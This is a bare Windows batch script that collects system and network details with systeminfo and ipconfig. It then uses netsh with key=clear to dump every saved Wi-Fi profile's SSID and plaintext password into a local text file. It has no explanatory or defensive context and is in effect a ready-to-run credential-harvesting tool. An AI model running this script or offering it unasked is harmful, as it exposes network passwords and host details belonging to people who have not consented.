@ECHO OFF
setlocal enabledelayedexpansion
systeminfo >systeminfo-out.txt
ipconfig /all >>ipconfig-out.txt
for /f "tokens=2 delims=:" %%a in ('netsh wlan show profile ^| findstr ":"') do (
    set "ssid=%%~a"
    call :getpwd "%%ssid:~1%%"
)

:getpwd
set "ssid=%*"
for /f "tokens=2 delims=:" %%i in ('netsh wlan show profile name^="%ssid:"=%" key^=clear ^| findstr /C:"Key Content"') do (
    echo ssid: %ssid% pass: %%i
) >> netshkeys-out.txt

exit /b